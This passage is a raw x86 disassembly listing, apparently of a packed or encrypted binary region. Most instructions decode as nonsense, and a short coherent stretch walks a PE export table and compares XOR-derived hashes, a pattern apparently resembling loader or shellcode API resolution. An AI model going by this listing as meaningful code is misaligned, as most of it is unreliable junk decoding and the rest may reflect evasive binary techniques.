  40ede3:	cmp    DWORD PTR [esi+0x2d],ebp
  40ede6:	inc    ecx
  40ede7:	push   0x36d58b02
  40edec:	cmp    eax,0xb3bb6cd8
  40edf1:	pop    esi
  40edf2:	xchg   BYTE PTR [esi-0x4cb9c263],ch
  40edf8:	arpl   WORD PTR [edx],bx
  40edfa:	neg    esp
  40edfc:	adc    eax,0x329d74f0
  40ee01:	int3   
  40ee02:	(bad)  
  40ee03:	mov    ecx,0xfa632dfd
  40ee08:	fild   QWORD PTR [edi-0x2876806c]
  40ee0e:	add    esp,ebp
  40ee10:	sbb    eax,0xa9d53f3b
  40ee15:	or     cl,BYTE PTR [edx-0x3f8c9513]
  40ee1b:	call   0x11cfeeb2
  40ee20:	cmp    al,0xf6
  40ee22:	icebp  
  40ee23:	sub    eax,0xfdbcaa07
  40ee28:	ror    esp,0xf8
  40ee2b:	(bad)  
  40ee2c:	fucom  st(7)
  40ee2e:	jns    0x40ee3a
  40ee30:	das    
  40ee31:	add    eax,0x4a194cde
  40ee36:	jae    0x40ee0f
  40ee38:	mov    BYTE PTR [ecx],bl
  40ee3a:	xor    bl,0xf5
  40ee3d:	sub    al,0xb3
  40ee3f:	daa    
  40ee40:	lock sbb DWORD PTR [ecx+0x6],esi
  40ee44:	cld    
  40ee45:	and    esp,DWORD PTR [ebx-0x15]
  40ee48:	(bad)  
  40ee4a:	push   ss
  40ee4b:	fwait
  40ee4c:	mov    WORD PTR [ebx+esi*4],?
  40ee4f:	mov    es,WORD PTR [ecx+0x14]
  40ee52:	imul   DWORD PTR [edi+0x16]
  40ee55:	mov    esi,0x3cd3aab1
  40ee5a:	and    al,BYTE PTR [esi]
  40ee5c:	jmp    0x40ee6c
  40ee5e:	mov    eax,0x8892629a
  40ee63:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40ee64:	dec    esi
  40ee65:	xor    BYTE PTR [ecx+0x6e443166],bh
  40ee6b:	dec    ebp
  40ee6c:	mov    edi,0xb108b360
  40ee71:	aas    
  40ee72:	add    ecx,edi
  40ee74:	div    DWORD PTR [esp+eax*1+0xb7e9f97]
  40ee7b:	es jnp 0x40eed8
  40ee7e:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40ee7f:	call   0xb1681e8f
  40ee84:	fsub   QWORD PTR [esi]
  40ee86:	and    ecx,DWORD PTR [ecx+0x5426dfa9]
  40ee8c:	sbb    BYTE PTR [esi+ebx*4],dl
  40ee8f:	add    BYTE PTR [ebp+0x30690f6a],dh
  40ee95:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40ee96:	in     eax,0x46
  40ee98:	or     al,0x19
  40ee9a:	mov    ch,0xa2
  40ee9c:	xchg   DWORD PTR [ebx+0x2e],ebp
  40ee9f:	test   al,0x92
  40eea1:	popf   
  40eea2:	jo     0x40ee55
  40eea4:	daa    
  40eea5:	push   0x50
  40eea7:	call   ecx
  40eea9:	fstp   DWORD PTR [eax]
  40eeab:	and    edx,DWORD PTR [esi]
  40eead:	mov    al,0x24
  40eeaf:	out    dx,al
  40eeb0:	xchg   DWORD PTR [ebx+0x1ce64d47],eax
  40eeb6:	ror    DWORD PTR [ecx+0x57],cl
  40eeb9:	dec    edi
  40eeba:	push   esi
  40eebb:	repnz push ebp
  40eebd:	shr    DWORD PTR [ebp+0x8c256cd],cl
  40eec3:	xchg   esp,eax
  40eec4:	xacquire xchg DWORD PTR [edx],ebp
  40eec7:	ret    
  40eec8:	inc    ebp
  40eec9:	sub    ebx,DWORD PTR [edx+0x3c8ddc55]
  40eecf:	in     al,0xd5
  40eed1:	mov    fs,edi
  40eed3:	imul   ecx,DWORD PTR [esp+0x125abe58],0x519a9522
  40eede:	cmp    eax,0x64b9ec3b
  40eee3:	or     eax,0x43f2bcca
  40eee8:	add    eax,0x2e994011
  40eeed:	inc    DWORD PTR ds:0x5921eb21
  40eef3:	jl     0x40eeed
  40eef5:	cmp    BYTE PTR [edx-0x31],bh
  40eef8:	popf   
  40eef9:	pop    edx
  40eefa:	and    bl,BYTE PTR [eax+0x6c]
  40eefd:	xchg   edx,eax
  40eefe:	dec    esp
  40eeff:	sub    BYTE PTR [ebp+0x4e],bl
  40ef02:	iret   
  40ef03:	cmp    eax,0xa3648d60
  40ef08:	repnz neg DWORD PTR ss:[bx+di-0x746e]
  40ef0f:	std    
  40ef10:	ins    BYTE PTR es:[edi],dx
  40ef11:	popf   
  40ef12:	xor    DWORD PTR es:[ebx+edi*1-0x4d],esp
  40ef17:	pop    esi
  40ef18:	(bad)  
  40ef19:	adc    ch,BYTE PTR [ecx]
  40ef1b:	xor    DWORD PTR [edi+0x76],0x58
  40ef1f:	(bad)  
  40ef20:	inc    eax
  40ef21:	daa    
  40ef22:	wrmsr  
  40ef24:	xor    eax,0x8b1639a3
  40ef29:	add    cl,BYTE PTR [edx+0x253f9b40]
  40ef2f:	jnp    0x40ef3b
  40ef31:	enter  0x25ec,0x99
  40ef35:	jmp    0x652e:0x93f2b373
  40ef3c:	xchg   esi,eax
  40ef3d:	pop    ebx
  40ef3e:	data16 cli 
  40ef40:	push   cs
  40ef41:	sbb    BYTE PTR [esi+0x78],dl
  40ef44:	push   edi
  40ef45:	mov    eax,ds:0x2b9b15db
  40ef4a:	mov    bl,0xe8
  40ef4c:	(bad)  
  40ef4d:	shr    al,1
  40ef4f:	out    dx,al
  40ef50:	mov    esi,0xafe638f9
  40ef55:	pop    ds
  40ef56:	in     al,dx
  40ef57:	fsub   QWORD PTR ds:0x19d59e88
  40ef5d:	ins    BYTE PTR es:[edi],dx
  40ef5e:	push   cs
  40ef5f:	mov    BYTE PTR [ecx],0x6a
  40ef62:	xchg   BYTE PTR [ebx+0x12],ch
  40ef65:	and    DWORD PTR [ebx-0x1aeebbf8],ecx
  40ef6b:	jl     0x40efe2
  40ef6d:	cwde   
  40ef6e:	cmp    ah,BYTE PTR [edi]
  40ef70:	loop   0x40ef8d
  40ef72:	addr16 pop es
  40ef74:	shr    DWORD PTR [edx-0x679799c5],cl
  40ef7a:	or     eax,0xe50e7293
  40ef7f:	dec    esp
  40ef80:	cmp    eax,0x2d1dfd6c
  40ef85:	xchg   edx,eax
  40ef86:	push   esp
  40ef87:	jp     0x40ef19
  40ef89:	push   0x5a
  40ef8b:	add    DWORD PTR [ecx+0x7b28e317],esi
  40ef91:	xor    BYTE PTR [esi-0x77],cl
  40ef94:	stc    
  40ef95:	jmp    0x40ef87
  40ef97:	ret    
  40ef98:	sbb    DWORD PTR [edx+0x79422a62],0xffffff8a
  40ef9f:	repz bound eax,QWORD PTR [edi-0x2093ddaa]
  40efa6:	ins    DWORD PTR es:[edi],dx
  40efa7:	nop
  40efa8:	mov    BYTE PTR [ebp-0x9],ch
  40efab:	bound  ebx,QWORD PTR [eax+edi*1+0x306633c]
  40efb2:	mov    edx,0xb12248f3
  40efb7:	adc    BYTE PTR [ecx],dl
  40efb9:	test   BYTE PTR [esi],0x92
  40efbc:	push   ebx
  40efbd:	sbb    al,0xb
  40efbf:	mov    bl,0x9a
  40efc1:	fs sub al,0xf9
  40efc4:	test   DWORD PTR [edx+eax*1+0x8e4e23],ebx
  40efcb:	fwait
  40efcc:	mov    bh,0x32
  40efce:	pushf  
  40efcf:	pop    ebp
  40efd0:	jae    0x40efac
  40efd2:	in     al,0x6c
  40efd4:	icebp  
  40efd5:	mov    dl,cl
  40efd7:	out    dx,eax
  40efd8:	cmp    al,0x61
  40efda:	ret    0x6b0d
  40efdd:	arpl   WORD PTR cs:[edx],dx
  40efe0:	xchg   esp,eax
  40efe1:	add    bh,BYTE PTR [edi-0x77]
  40efe4:	xchg   edx,eax
  40efe5:	pop    ss
  40efe6:	push   0xffffffc9
  40efe8:	(bad)  
  40efe9:	lods   al,BYTE PTR ds:[esi]
  40efea:	and    ecx,DWORD PTR [edi-0x43a8d7f]
  40eff0:	mov    al,0x95
  40eff2:	sub    eax,0x9b444ecb
  40eff7:	in     al,dx
  40eff8:	outs   dx,BYTE PTR ds:[esi]
  40eff9:	xor    ch,BYTE PTR [edi-0x68]
  40effc:	inc    ebx
  40effd:	das    
  40effe:	into   
  40efff:	gs and al,0x2b
  40f002:	push   es
  40f003:	mov    esi,0x8ced0809
  40f008:	int    0x8a
  40f00a:	jg     0x40f036
  40f00c:	push   0x656b5914
  40f011:	sti    
  40f012:	out    dx,al
  40f013:	arpl   WORD PTR [ebx+0x2563de2f],si
  40f019:	mov    al,0xee
  40f01b:	xchg   ebx,eax
  40f01c:	outs   dx,BYTE PTR ds:[esi]
  40f01d:	mul    edx
  40f01f:	mov    DWORD PTR [edi-0x49],edx
  40f022:	xor    ebp,DWORD PTR [esi+ecx*1]
  40f025:	jmp    0x40f02d
  40f027:	push   0xcb7acef4
  40f02c:	lds    eax,FWORD PTR [ecx-0x1f34137]
  40f032:	sub    ebp,DWORD PTR [edx]
  40f034:	ss pop esi
  40f036:	cmp    al,0xd1
  40f038:	mov    al,0x5e
  40f03a:	mov    dl,0x4e
  40f03c:	xor    dh,dh
  40f03e:	outs   dx,DWORD PTR ds:[esi]
  40f03f:	sub    eax,0x6de10584
  40f044:	push   ecx
  40f045:	dec    esi
  40f046:	jecxz  0x40efe4
  40f048:	jns    0x40f09a
  40f04a:	sbb    edx,esi
  40f04c:	retf   
  40f04d:	dec    eax
  40f04e:	retf   0x77ad
  40f051:	mov    ds:0x579d73c7,eax
  40f056:	mov    esp,0xbc2ac734
  40f05b:	jbe    0x40f012
  40f05d:	mov    DWORD PTR [eax+0x7fff3355],edx
  40f063:	or     esp,DWORD PTR [edx-0x4]
  40f066:	adc    eax,DWORD PTR [esi+0x6f]
  40f069:	lds    ebx,FWORD PTR [edx+edi*4-0x38f07489]
  40f070:	ss xor eax,0x30d6c579
  40f076:	pop    ebx
  40f077:	repnz pop ebx
  40f079:	mov    cl,0xd1
  40f07b:	sbb    bl,BYTE PTR [edi-0x42f39a7]
  40f081:	scas   eax,DWORD PTR es:[edi]
  40f082:	sub    DWORD PTR [ecx-0x3fcd888c],0x59
  40f089:	mov    ecx,0x19e4bf17
  40f08e:	push   esp
  40f08f:	xchg   esp,eax
  40f090:	push   ss
  40f091:	xchg   edx,eax
  40f092:	popa   
  40f093:	out    dx,al
  40f094:	dec    esi
  40f095:	pusha  
  40f096:	jle    0x40f0d2
  40f098:	xor    DWORD PTR [esi+ebp*2],edi
  40f09b:	add    esp,0x7e
  40f09e:	push   edx
  40f09f:	jecxz  0x40f10c
  40f0a1:	jbe    0x40f111
  40f0a3:	sar    ah,0x24
  40f0a6:	ror    BYTE PTR [esi+0x7eb64a55],cl
  40f0ac:	adc    bh,BYTE PTR [ecx]
  40f0ae:	pop    ss
  40f0af:	push   esi
  40f0b0:	pop    ebp
  40f0b1:	retf   0xf45e
  40f0b4:	in     al,0x95
  40f0b6:	iret   
  40f0b7:	lea    edx,[ecx]
  40f0b9:	xchg   DWORD PTR [edi+0x13],esp
  40f0bc:	jle    0x40f0f0
  40f0be:	(bad)  
  40f0bf:	leave  
  40f0c0:	loopne 0x40f12c
  40f0c2:	je     0x40f0ff
  40f0c4:	inc    edi
  40f0c6:	aad    0x82
  40f0c8:	mov    al,ds:0x36f24793
  40f0cd:	sub    eax,0x75ec5ca5
  40f0d2:	les    ecx,FWORD PTR [eax]
  40f0d4:	pop    esi
  40f0d5:	or     DWORD PTR [ecx+0x21],0x10
  40f0d9:	cmp    al,0xd9
  40f0db:	and    BYTE PTR [edx+eax*2-0x70a56eb9],ah
  40f0e2:	push   esi
  40f0e3:	dec    eax
  40f0e4:	add    al,BYTE PTR [eax-0x69496a74]
  40f0ea:	dec    eax
  40f0eb:	ja     0x40f0d9
  40f0ed:	pop    ecx
  40f0ee:	cld    
  40f0ef:	pop    esp
  40f0f0:	pop    es
  40f0f1:	loop   0x40f13d
  40f0f3:	int3   
  40f0f4:	sub    cl,ah
  40f0f6:	xchg   BYTE PTR [edx+0x7b0706b],dh
  40f0fc:	sbb    eax,0x288f1bd1
  40f101:	xor    esi,ecx
  40f103:	(bad)  
  40f104:	ficomp DWORD PTR gs:[esi]
  40f107:	sar    DWORD PTR [edx+0x60],0x5c
  40f10b:	mov    eax,ds:0xe51063f4
  40f110:	pushf  
  40f111:	pushf  
  40f112:	jecxz  0x40f187
  40f114:	or     BYTE PTR ds:0x5845bcc,bl
  40f11a:	xchg   esi,eax
  40f11b:	and    ah,BYTE PTR ds:0x8895432e
  40f121:	cmp    al,0x8b
  40f123:	enter  0xc033,0xc1
  40f127:	jmp    0x4589:0x14550b02
  40f12e:	adc    BYTE PTR [ebx+0x1ee1c103],cl
  40f134:	xor    ecx,0xc0000000
  40f13a:	mov    DWORD PTR [ebp-0x64],edx
  40f13d:	mov    edx,DWORD PTR [ebx+0x4]
  40f140:	xor    eax,0xba699573
  40f145:	mov    DWORD PTR [ebp+0x14],ecx
  40f148:	mov    ecx,0x9c0a89d8
  40f14d:	xor    edx,ecx
  40f14f:	shrd   eax,edx,0x2
  40f153:	or     eax,DWORD PTR [ebp+0x10]
  40f156:	shr    edx,0x2
  40f159:	mov    DWORD PTR [ebp-0x70],eax
  40f15c:	mov    eax,edx
  40f15e:	or     eax,DWORD PTR [ebp+0x14]
  40f161:	mov    DWORD PTR [ebp-0x5c],edx
  40f164:	mov    DWORD PTR [ebp-0x6c],eax
  40f167:	mov    eax,DWORD PTR [ebp-0x70]
  40f16a:	cmp    DWORD PTR [ebp-0x68],eax
  40f16d:	jne    0x40f17f
  40f173:	mov    eax,DWORD PTR [ebp-0x6c]
  40f176:	cmp    DWORD PTR [ebp-0x64],eax
  40f179:	je     0x40fcce
  40f17f:	mov    eax,DWORD PTR [ebp+0x8]
  40f182:	mov    edx,DWORD PTR [ebp+0xc]
  40f185:	mov    edx,DWORD PTR [ebp-0x4]
  40f188:	mov    edx,DWORD PTR [edx+0x3c]
  40f18b:	lea    eax,[edx+eax*8+0x78]
  40f18f:	mov    edx,DWORD PTR [ebp-0x4]
  40f192:	mov    eax,DWORD PTR [edx+eax*1]
  40f195:	mov    DWORD PTR [ebp-0x24],eax
  40f198:	jmp    0x40f722
  40f19d:	mov    al,ds:0x187ff383
  40f1a2:	jle    0x40f1c4
  40f1a4:	sub    BYTE PTR [eax-0x7a57b743],cl
  40f1aa:	mov    ch,0x92
  40f1ac:	mov    dl,0xb5
  40f1ae:	xchg   BYTE PTR [esi],dl
  40f1b0:	push   ss
  40f1b1:	cmp    eax,0x1161604
  40f1b6:	rcl    ebx,0xdd
  40f1b9:	add    ch,0xbd
  40f1bc:	not    DWORD PTR [edi-0x68]
  40f1bf:	cmp    DWORD PTR [ecx],esp
  40f1c1:	add    ch,BYTE PTR [ebp-0x7d]
  40f1c4:	out    0x61,eax
  40f1c6:	mov    bl,bl
  40f1c8:	cs pop ebp
  40f1ca:	and    al,0x66
  40f1cc:	push   ecx
  40f1cd:	hlt    
  40f1ce:	popa   
  40f1cf:	loop   0x40f1ef
  40f1d1:	sub    BYTE PTR ds:0xaa112d72,dh
  40f1d7:	scas   al,BYTE PTR es:[edi]
  40f1d8:	pop    edi
  40f1d9:	or     bl,bh
  40f1db:	xchg   edx,eax
  40f1dc:	clc    
  40f1dd:	aaa    
  40f1de:	push   ecx
  40f1df:	push   es
  40f1e0:	sahf   
  40f1e1:	add    DWORD PTR [esi+0x5ba189e4],0x4a
  40f1e8:	sub    ecx,ebx
  40f1ea:	dec    edi
  40f1eb:	add    al,0x76
  40f1ed:	push   0xedb4cd20
  40f1f2:	cmp    eax,0xcfa449b3
  40f1f7:	sub    ebx,DWORD PTR [edx-0x1d3622f0]
  40f1fd:	xor    esi,DWORD PTR fs:[eax-0x4b]
  40f201:	cmp    ecx,0x78e5d3
  40f207:	outs   dx,BYTE PTR ds:[esi]
  40f208:	test   DWORD PTR [edx-0x4],ecx
  40f20b:	xchg   BYTE PTR [ebx-0x65],bl
  40f20e:	and    BYTE PTR ds:0x90de6e79,bl
  40f214:	ins    BYTE PTR es:[edi],dx
  40f215:	cmp    eax,0x1e615dbf
  40f21a:	fidiv  WORD PTR [edx]
  40f21c:	in     eax,dx
  40f21d:	iret   
  40f21e:	shl    DWORD PTR [edi+0x7b18506e],0x31
  40f225:	cli    
  40f226:	xor    cl,BYTE PTR [edx]
  40f228:	test   al,0x44
  40f22a:	iret   
  40f22b:	mov    ?,WORD PTR [esp+eax*8]
  40f22e:	dec    ebp
  40f22f:	push   esp
  40f230:	mov    eax,esi
  40f232:	std    
  40f233:	adc    bl,BYTE PTR [ebx+eiz*4-0x7eb2f5ad]
  40f23a:	arpl   WORD PTR [esi+0x52],bp
  40f23d:	fwait
  40f23e:	jbe    0x40f1e6
  40f240:	mov    WORD PTR [edi],fs
  40f242:	fcomp  DWORD PTR [esi-0x4f]
  40f245:	clc    
  40f246:	(bad)  
  40f247:	xor    eax,esi
  40f249:	or     ah,cl
  40f24b:	nop
  40f24c:	dec    eax
  40f24d:	mov    cl,0xb5
  40f24f:	push   cs
  40f250:	mov    ebx,0x4e6a8cd3
  40f255:	cmp    BYTE PTR [edx-0x57e304bd],cl
  40f25b:	in     eax,dx
  40f25c:	rol    eax,0x67
  40f25f:	and    dh,BYTE PTR [edi+ecx*1]
  40f262:	push   es
  40f263:	not    ebp
  40f265:	mov    esp,?
  40f267:	fadd   DWORD PTR [esi+0x52]
  40f26a:	in     al,0x7c
  40f26c:	ds xchg esp,eax
  40f26e:	and    ebx,DWORD PTR [eax-0x32ed64eb]
  40f274:	stc    
  40f275:	sbb    DWORD PTR [edx-0x73],ebp
  40f278:	ins    BYTE PTR es:[edi],dx
  40f279:	inc    ecx
  40f27a:	adc    al,0xda
  40f27c:	xor    dl,BYTE PTR [edi-0x14]
  40f27f:	iret   
  40f280:	dec    edi
  40f281:	mov    esp,0xae90cd28
  40f286:	fdivr  DWORD PTR [edi]
  40f288:	push   ss
  40f289:	in     eax,0x12
  40f28b:	aam    0x90
  40f28d:	mov    edi,DWORD PTR [edx-0x55]
  40f290:	sbb    dh,0x81
  40f293:	out    0x30,eax
  40f295:	les    eax,FWORD PTR [ebx-0x2039243]
  40f29b:	retf   
  40f29c:	mov    ecx,0xe4daa03d
  40f2a1:	test   al,0xfd
  40f2a3:	fistp  QWORD PTR [edi]
  40f2a5:	jecxz  0x40f253
  40f2a7:	stos   BYTE PTR es:[edi],al
  40f2a8:	cdq    
  40f2a9:	mov    bh,0xfd
  40f2ab:	outs   dx,BYTE PTR ds:[esi]
  40f2ac:	loopne 0x40f318
  40f2ae:	ret    0xe8e7
  40f2b1:	cmp    BYTE PTR [eax-0x1256053f],dh
  40f2b7:	(bad)  [eax]
  40f2b9:	retf   0xb6ff
  40f2bc:	ins    DWORD PTR es:[edi],dx
  40f2bd:	jmp    0x2871d0dc
  40f2c2:	(bad)  
  40f2c3:	aad    0x13
  40f2c5:	mov    edx,0xf16b06
  40f2ca:	loopne 0x40f311
  40f2cc:	das    
  40f2cd:	cmp    esi,0x692e0a48
  40f2d3:	jecxz  0x40f2fc
  40f2d5:	push   esi
  40f2d6:	xor    eax,0xb641f3ac
  40f2db:	sbb    eax,0xba8eb1e2
  40f2e0:	pop    edx
  40f2e1:	jo     0x40f337
  40f2e3:	pop    edx
  40f2e4:	push   ecx
  40f2e5:	adc    dl,BYTE PTR [edx-0x7e]
  40f2e8:	jmp    0x40f27b
  40f2ea:	push   0x70
  40f2ec:	and    BYTE PTR [eax+edi*1+0xb],al
  40f2f0:	mov    ecx,0x451833b
  40f2f5:	out    dx,al
  40f2f6:	jnp    0x40f31f
  40f2f8:	push   ecx
  40f2f9:	and    BYTE PTR [ebx-0x61],0x76
  40f2fd:	add    BYTE PTR [edi-0x6b874318],0xaa
  40f304:	nop
  40f305:	mov    esi,0x854e68e
  40f30a:	sbb    eax,0x2148ffe1
  40f30f:	mov    ds:0xa84be71a,al
  40f314:	popa   
  40f315:	and    bh,BYTE PTR [ebx-0x53]
  40f318:	push   cs
  40f319:	fbstp  TBYTE PTR [ecx+ecx*1-0x3a]
  40f31d:	dec    eax
  40f31e:	mov    ds:0x1d611bbc,eax
  40f323:	les    esp,FWORD PTR [edi+0x6ede6a46]
  40f329:	in     eax,dx
  40f32a:	fild   DWORD PTR [esi+ecx*2]
  40f32d:	xchg   DWORD PTR [eax-0x1d],ebx
  40f330:	add    dl,BYTE PTR ds:0xdefb0d04
  40f336:	pop    esi
  40f337:	fstp   TBYTE PTR [ecx]
  40f339:	adc    BYTE PTR [ebp+ebx*2-0x1880337b],ah
  40f340:	inc    ebp
  40f341:	(bad)  
  40f342:	pop    edx
  40f343:	jbe    0x40f37c
  40f345:	outs   dx,DWORD PTR ds:[esi]
  40f346:	xchg   edi,eax
  40f347:	jl     0x40f3c8
  40f349:	cmps   BYTE PTR cs:[esi],BYTE PTR es:[edi]
  40f34b:	hlt    
  40f34c:	in     eax,dx
  40f34d:	dec    ebx
  40f34e:	mov    eax,DWORD PTR [esi]
  40f350:	sti    
  40f351:	mov    ss,ebx
  40f353:	and    DWORD PTR [edi-0x3be2b61c],ebp
  40f359:	lahf   
  40f35a:	cmp    bh,dl
  40f35c:	loop   0x40f388
  40f35e:	push   es
  40f35f:	int    0x82
  40f361:	jnp    0x40f36d
  40f363:	(bad)  
  40f365:	clc    
  40f366:	in     ax,0x1f
  40f369:	shl    BYTE PTR [eax+0x7b],cl
  40f36c:	xor    ah,BYTE PTR [edi+eax*4-0x2983e232]
  40f373:	lods   al,BYTE PTR ds:[esi]
  40f374:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40f375:	sahf   
  40f376:	lods   eax,DWORD PTR ds:[esi]
  40f377:	cmc    
  40f378:	in     al,dx
  40f379:	(bad)  
  40f37a:	adc    dh,BYTE PTR [ecx-0x5567781]
  40f380:	xor    al,al
  40f382:	dec    ebx
  40f383:	adc    al,0xaf
  40f385:	pop    ebp
  40f386:	push   ecx
  40f387:	out    dx,eax
  40f388:	mov    ebp,0x3438a6e6
  40f38d:	and    al,BYTE PTR [eax-0x1c]
  40f390:	out    0x1c,al
  40f392:	fidivr WORD PTR [edx]
  40f394:	cmp    DWORD PTR [eax+edx*8],eax
  40f397:	pop    ds
  40f398:	pop    eax
  40f399:	and    esi,DWORD PTR [eax-0x1d060598]
  40f39f:	or     al,0x6e
  40f3a1:	jb     0x40f3b2
  40f3a3:	ins    BYTE PTR es:[edi],dx
  40f3a4:	lock dec edi
  40f3a6:	in     eax,0x16
  40f3a8:	xchg   DWORD PTR cs:[eax-0x7841f325],esp
  40f3af:	or     ch,dh
  40f3b1:	inc    esi
  40f3b2:	in     eax,0x63
  40f3b4:	xlat   BYTE PTR ds:[ebx]
  40f3b5:	aaa    
  40f3b6:	mov    BYTE PTR [edx],cl
  40f3b8:	bound  ecx,QWORD PTR [edi-0x5d1fde7c]
  40f3be:	pop    edi
  40f3bf:	jg     0x40f34a
  40f3c1:	scas   eax,DWORD PTR es:[edi]
  40f3c2:	jno    0x40f3df
  40f3c4:	hlt    
  40f3c5:	cwde   
  40f3c6:	pop    eax
  40f3c7:	xchg   ebx,eax
  40f3c8:	out    0xe4,al
  40f3ca:	inc    esp
  40f3cb:	and    ecx,esi
  40f3cd:	mov    gs,WORD PTR [edx-0x63160b06]
  40f3d3:	pop    edx
  40f3d4:	(bad)  [edi+0x7b]
  40f3d7:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40f3d8:	test   eax,0xf0c2afbc
  40f3dd:	test   ch,ch
  40f3df:	dec    ebx
  40f3e0:	(bad)  
  40f3e2:	shr    edx,1
  40f3e4:	jns    0x40f36e
  40f3e6:	mov    cl,0xb7
  40f3e8:	data16 jecxz 0x40f395
  40f3eb:	pop    ds
  40f3ec:	loop   0x40f42e
  40f3ee:	rcl    DWORD PTR [esi+eiz*4+0x34],1
  40f3f2:	xor    dh,al
  40f3f4:	cmp    al,0x4e
  40f3f6:	mov    al,cl
  40f3f8:	das    
  40f3f9:	push   es
  40f3fa:	adc    DWORD PTR [ebx],esp
  40f3fc:	jae    0x40f447
  40f3fe:	pop    edx
  40f3ff:	mov    edi,0x7059c1cd
  40f404:	push   esi
  40f405:	mov    cs,WORD PTR [ebx]
  40f407:	in     eax,dx
  40f408:	(bad)  
  40f40a:	mov    bh,0x64
  40f40c:	push   esi
  40f40d:	sbb    ecx,DWORD PTR [eax+0x662bc]
  40f413:	push   ecx
  40f414:	pushf  
  40f415:	(bad)  [ebx-0x68da4da3]
  40f41b:	test   eax,0xe27f84a2
  40f420:	dec    ebp
  40f421:	ret    
  40f422:	xor    edx,DWORD PTR es:[eax]
  40f425:	stc    
  40f426:	dec    edx
  40f427:	push   ss
  40f428:	and    eax,0x90fec83b
  40f42d:	iret   
  40f42e:	xchg   BYTE PTR [edx+eiz*4],bl
  40f431:	gs loop 0x40f4ad
  40f434:	mov    dh,BYTE PTR [eax]
  40f436:	addr16 dec ebp
  40f438:	pop    edi
  40f439:	ins    DWORD PTR es:[edi],dx
  40f43a:	pop    ds
  40f43b:	inc    ebx
  40f43c:	dec    eax
  40f43d:	pop    esp
  40f43e:	call   0xacb6:0xc68ce458
  40f445:	mov    ds,WORD PTR [ecx]
  40f447:	outs   dx,BYTE PTR ds:[esi]
  40f448:	stos   BYTE PTR es:[di],al
  40f44a:	mov    al,0x89
  40f44c:	push   ebx
  40f44d:	mov    fs,WORD PTR gs:[eax-0x1e4be281]
  40f454:	inc    eax
  40f455:	dec    ecx
  40f456:	lahf   
  40f457:	sub    ch,BYTE PTR [edi]
  40f459:	scas   al,BYTE PTR es:[edi]
  40f45a:	dec    ecx
  40f45b:	out    0xc7,eax
  40f45d:	daa    
  40f45e:	lods   eax,DWORD PTR ds:[esi]
  40f45f:	mov    al,ds:0xafb55478
  40f464:	(bad)  
  40f465:	jecxz  0x40f44a
  40f467:	popf   
  40f468:	ret    
  40f469:	pop    ss
  40f46a:	test   eax,0x8b828e6a
  40f46f:	das    
  40f470:	fisttp DWORD PTR [eax]
  40f472:	(bad)
  40f475:	mov    cl,0xa7
  40f477:	test   BYTE PTR [ecx+0xd],bh
  40f47a:	adc    esi,DWORD PTR [ecx-0x13]
  40f47d:	pop    ebx
  40f47e:	lods   eax,DWORD PTR ds:[esi]
  40f47f:	adc    ebx,ecx
  40f481:	inc    ebx
  40f482:	cmp    ebp,DWORD PTR [ecx+0x23e5bb4f]
  40f488:	leave  
  40f489:	(bad)  
  40f48a:	pop    esp
  40f48b:	push   esi
  40f48c:	xor    BYTE PTR [edx+0xf],ch
  40f48f:	enter  0x1d84,0x77
  40f493:	xchg   ebp,eax
  40f494:	dec    esp
  40f495:	sbb    edx,edi
  40f497:	xchg   edi,eax
  40f498:	jg     0x40f453
  40f49a:	mov    ebp,0xda9f3728
  40f49f:	xchg   DWORD PTR [edx-0x26],ecx
  40f4a2:	push   edx
  40f4a3:	clc    
  40f4a4:	adc    al,0xae
  40f4a6:	push   eax
  40f4a7:	inc    eax
  40f4a8:	scas   al,BYTE PTR es:[edi]
  40f4a9:	and    BYTE PTR [esi+0x32],ah
  40f4ac:	push   0x12
  40f4ae:	and    BYTE PTR [eax+ebp*2+0x725cc004],0x81
  40f4b6:	push   0x8645697e
  40f4bb:	add    BYTE PTR [ebx],bh
  40f4bd:	ss dec edx
  40f4bf:	repnz sbb DWORD PTR [esi],edx
  40f4c2:	sub    esi,edx
  40f4c4:	(bad)  
  40f4c5:	aas    
  40f4c6:	mov    edx,DWORD PTR [ebp-0x4b]
  40f4c9:	and    esp,DWORD PTR [bp+0x74b2]
  40f4ce:	sub    DWORD PTR [esi-0x3c59678e],eax
  40f4d4:	and    edx,DWORD PTR [eax]
  40f4d6:	xchg   edx,eax
  40f4d7:	xchg   BYTE PTR [eax-0x733ecb14],ch
  40f4dd:	jnp    0x40f53c
  40f4df:	dec    esp
  40f4e0:	out    dx,al
  40f4e1:	ins    DWORD PTR es:[edi],dx
  40f4e2:	xor    eax,0xc7e2384b
  40f4e7:	repz out 0xf7,eax
  40f4ea:	jnp    0x40f490
  40f4ec:	and    al,BYTE PTR [ecx]
  40f4ee:	xlat   BYTE PTR ds:[ebx]
  40f4ef:	mov    al,BYTE PTR [ebx+0x1272a75f]
  40f4f5:	push   edi
  40f4f6:	test   ebp,ebp
  40f4f8:	mov    bl,0xc8
  40f4fa:	push   ecx
  40f4fb:	adc    eax,0x54a8e154
  40f500:	test   al,0x7d
  40f502:	sar    BYTE PTR [ebp+ebx*2-0x54],1
  40f506:	adc    BYTE PTR [edi+eax*1+0x45d02d1f],bl
  40f50d:	xchg   edx,eax
  40f50e:	loop   0x40f493
  40f510:	mov    eax,ds:0x92d5196f
  40f515:	mov    bh,0x3b
  40f517:	ins    DWORD PTR es:[edi],dx
  40f518:	call   0xb0d32f48
  40f51d:	stc    
  40f51e:	sbb    BYTE PTR ss:[ecx+edi*2+0x7a4fcb5],bl
  40f526:	cdq    
  40f527:	pop    ds
  40f528:	push   ebp
  40f529:	jecxz  0x40f520
  40f52b:	inc    edi
  40f52c:	(bad)  
  40f52d:	stc    
  40f52e:	cwde   
  40f52f:	pop    esi
  40f530:	cld    
  40f531:	retf   
  40f532:	addr16 out dx,al
  40f534:	xor    BYTE PTR [esi+0x563f79b],ah
  40f53a:	push   ds
  40f53b:	mov    al,0x8c
  40f53d:	xchg   DWORD PTR [ecx+0x5b],ebp
  40f540:	sbb    eax,ebx
  40f542:	jg     0x40f528
  40f544:	add    al,BYTE PTR [edx]
  40f546:	mov    ds:0x69697509,eax
  40f54b:	jne    0x40f523
  40f54d:	pop    ds
  40f54e:	call   0x7747:0xedc2f291
  40f555:	xchg   esi,eax
  40f556:	jb     0x40f502
  40f558:	or     dl,bh
  40f55a:	xlat   BYTE PTR ds:[ebx]
  40f55b:	repnz popf 
